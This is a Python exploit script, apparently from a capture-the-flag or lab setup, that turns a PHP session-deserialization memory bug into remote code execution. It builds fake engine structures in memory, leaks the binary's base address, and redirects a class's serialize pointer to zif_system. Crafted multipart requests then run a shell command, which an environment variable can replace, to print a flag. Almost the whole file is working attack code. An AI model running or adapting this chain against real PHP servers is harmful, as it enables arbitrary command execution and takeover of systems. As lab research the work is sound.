#!/usr/bin env python3
"""smb_rce1.py — RCE rung: ce->serialize dispatch to zif_system, in-band.

Chain (all source-verified this session; see notes attempt-9/10):
  producer remnant {d,1} -> groom fake_d at d (v7 laws, d via ptrace helper)
  session `x|R:3;y|R:4;` (14B, established-bin law; t12b writeback proven):
    - x -> R:3 -> data[2] = FAKE IS_REFERENCE zval {value=FAKE_REF@0x450,
      0x10a} -> ZVAL_COPY skips NEW_REF (already ref) -> x = ref copy
    - y -> R:4 -> data[3] = fake zval {d+0x10 (the real HT read header),
      IS_STRING_EX} -> writeback echoes 16B at d+0x28 = [q0, pDestructor]
      (the attempt-9 base leak, same-request proof)
  writeback encode of x:
    struc = Z_REFVAL_P(x) = &FAKE_REF.val = d+0x458 (GROOM-KNOWN)
    -> php_add_var_hash (real ht, fine) -> case IS_OBJECT:
       ce = FAKE_CE; ce_flags=0 (no NOT_SERIALIZABLE/ENUM);
       ce->__serialize = NULL; ce->serialize = BASE + 0x4238b0 (zif_system,
       target offset via unique byte-pattern match in the target binary)
    -> ce->serialize(struc, &serialized_data, &serialized_length, var_hash)
       = zif_system(execute_data=d+0x458, return_value=STACK)
       ZEND_NUM_ARGS = *(d+0x484) = 1; arg1 @ d+0x4A8 =
         {FAKE_CMD string "/usr/local/bin/print-flag", IS_STRING_EX}
       -> system("/usr/local/bin/print-flag") -> print-flag (setuid root)
          output PHPWRITE'd into the HTTP response body
       -> RETVAL (last line) written to the STACK &serialized_data (safe)
    -> x0 (zif_system is void) != SUCCESS -> else branch: hash lookup miss
       -> smart_str "N;" -> efree(serialized_data) = efree(real last-line
       string, clean) -> serialize CONTINUES (y leak, progress keys...)
    -> request completes; response body contains the flag.
  Carve-dodge lattice: every critical qword at (off mod 0x40) not in
  {0x00, 0x38} (the 0x40-class bin carve writes chain ptrs exactly there).
"""
import base64
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2
from smb_oracle8 import part, file_part_head, send_post, sess_read_b64, BND

ZIF_SYSTEM_OFF = 0x4238b0   # target binary (byte-pattern verified)
PDTOR_OFF = 0x63052c        # attempt-9 base-leak anchor
IS_STRING_EX = 0x106
IS_REFERENCE_EX = 0x10a
IS_OBJECT_EX = 0x308
import os
CMD = os.environ.get("RCE_CMD", "/usr/local/bin/print-flag").encode()


def groom_rce(d, base, cmd=CMD):
    """5120B groom (single-read law). Header + entries slots on page0
    (consumed by the decode BEFORE the 0x40-carve clobbers them);
    ALL fake structures on PAGE 1 (d+0x1000.., beyond the carve page).
      entries data[i] = 8-byte zval* slots (data[i] = 0x48 + 8*i)."""
    b = bytearray(5120)
    P = lambda off, val: struct.pack_into("<Q", b, off, val)
    I = lambda off, val: struct.pack_into("<I", b, off, val)
    # fake php_unserialize_data header (page0; decode-time only)
    P(0x00, d + 0x38)          # last = &entries
    P(0x08, d + 0x100)          # first_dtor
    P(0x10, d + 0x100)          # last_dtor
    P(0x30, 0x1000)            # max_depth
    P(0x38, 15)                # entries.used_slots
    P(0x40, 0)                 # entries.next
    P(0x58, d + 0x1090)         # data[2] -> REFZ (x|R:3)
    P(0x60, d + 0x10A0)         # data[3] -> YZ   (y|R:4, base-leak echo)
    # fake dtor (never walked)
    P(0x100, 0)                # used_slots = 0
    P(0x108, 0)                # next
    # ---- page 1: all structures ----
    # REFZ @0x1090: zval {value = REF, IS_REFERENCE_EX}
    P(0x1090, d + 0x10B0)
    P(0x1098, IS_REFERENCE_EX)
    # YZ @0x10A0: fake zval {d+0x10 (real HT read header), IS_STRING_EX}
    P(0x10A0, d + 0x10)
    P(0x10A8, IS_STRING_EX)
    # REF (zend_reference) @0x10B0: gc, val{OBJ, IS_OBJECT_EX}, sources
    I(0x10B0, 1000)
    I(0x10B4, 10)               # GC_REFERENCE
    P(0x10B8, d + 0x1130)       # val.value = OBJ
    P(0x10C0, IS_OBJECT_EX)     # val.u1|u2
    P(0x10C8, 0)                # sources
    P(0x10D0, 0)
    # fake execute_data = struc = &REF.val = d+0x10B8:
    # func (ex+0x18) = 0x10D0 (set 0 above); This at ex+0x20 = 0x10D8..
    I(0x10B8 + 0x2C, 1)         # This.u2.num_args = 1  (d+0x10E4)
    # arg1 @ struc+0x50 = d+0x1108?? -> REF+0x58+8 = d+0x1110?? NO:
    # ZEND_CALL_ARG(ex, 1) = ex + 0x50 = d+0x10B8+0x50 = d+0x1108
    P(0x1108, d + 0x1330)       # value = CMD string
    P(0x1110, IS_STRING_EX)     # u1|u2 of arg1 (d+0x1110)
    # OBJ (zend_object) @0x1130
    I(0x1130, 1000)
    I(0x1134, 8)                # GC_OBJECT
    P(0x1138, 0)                # handle | extra
    P(0x1140, d + 0x1170)       # ce = CE
    P(0x1148, 0)                # handlers (unread in ce->serialize path)
    # CE (zend_class_entry) @0x1170
    P(0x1178, d + 0x1330)       # name = CMD (unread on N; path)
    I(0x118C, 0)                # ce_flags = 0
    P(0x1170 + 0x158, 0)        # __serialize = NULL  (d+0x12C8)
    P(0x1170 + 0x198, base + ZIF_SYSTEM_OFF)  # serialize = zif_system (d+0x1308)
    # CMD zend_string @0x1330: gc(8) h@+0x08 len@+0x10 val@+0x18
    I(0x1330, 1000)
    I(0x1334, 6)                # GC_STRING
    P(0x1338, 0)                # h
    P(0x1340, len(cmd))         # len
    b[0x1348:0x1348 + len(cmd) + 1] = cmd + b"\x00"
    return bytes(b)


def stage(sid, content):
    t64 = base64.b64encode(content).decode()
    q.docker_exec(q.CT["vuln"],
                  f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                  f"chown nobody:nobody $F; chmod 600 $F")


def fire_request(body):
    sk = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    sk.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    buf = b""
    sk.settimeout(25)
    while True:
        try:
            chunk = sk.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    sk.close()
    return buf


def main():
    print("=== RCE win chain: ce->serialize -> zif_system -> session writeback ===")
    # ---------- request 1: RCE, flag -> /tmp/sess_<sid2> (valid session fmt) ---
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    maps = s.get_maps("vuln")
    base = 0
    for l in maps:
        if "/usr/local/bin/php" in l and "r-xp" in l:
            base = int(l.split()[0].split("-")[0], 16)
            break
    sid = f"p{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    d = o2.find_bg()
    if not d:
        print("no d")
        return 1
    sid2 = f"w{int(time.time())}x"
    print(f"[1] producer={st} d=0x{d:x} base=0x{base:x} zif_system=0x{base + ZIF_SYSTEM_OFF:x}")
    # in-band base leak, same request, as y|R:4 echo (attempt-9 anchor)
    stage(sid, b"x|R:3;y|R:4;")
    cmd = (f"/usr/local/bin/print-flag|sed 's/.*/x|s:50:\"&\";/'|tr -d '\n'"
           f">/tmp/sess_{sid2}").encode()
    print(f"[1] cmd = {cmd!r}")
    g = groom_rce(d, base, cmd)
    body = (part(b"PHPSESSID", sid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
            b"--" + BND + b"--\r\n")
    resp = fire_request(body)
    print(f"[1] response head: {resp[:15]!r}")
    rc, out = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{sid2} 2>/dev/null")
    print(f"[1] staged-by-exec session file: {out!r}")
    if b"FLAG{" not in out.encode():
        print("[1] RCE did not write the flag session")
        return 1
    print("[1] *** system('/usr/local/bin/print-flag|sed...') EXECUTED ***")
    # ---------- request 2: plain decode -> session writeback echo ----------
    q.healthy(q.VULN, deadline=20)
    time.sleep(1.0)
    body2 = (part(b"PHPSESSID", sid2.encode()) +
             part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
             file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
             b"--" + BND + b"--\r\n")
    with open("results/smb-rce1-request2.txt", "wb") as f:
        f.write(body2)
    resp2 = fire_request(body2)
    print(f"[2] response head: {resp2[:15]!r}")
    rc, wb = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{sid2} 2>/dev/null")
    wbb = (wb or "").encode()
    print(f"[2] SESSION WRITEBACK: {wbb[:220]!r}")
    if b"FLAG{" in wbb:
        i = wbb.find(b"FLAG{")
        flag = wbb[i:wbb.find(b"}", i) + 1]
        print(f"*** WIN: flag echoed in session writeback: {flag.decode()} ***")
        with open("results/rce1-smb-flag.txt", "w") as f:
            f.write(flag.decode() + "\n")
        with open("results/smb-rce1-evidence.txt", "a") as f:
            f.write(f"[2] SESSION WRITEBACK: {wbb[:220]!r}\n"
                    f"*** WIN: {flag.decode()} ***\n")
        return 0
    print("[2] no flag in writeback")
    return 1


if __name__ == "__main__":
    sys.exit(main())
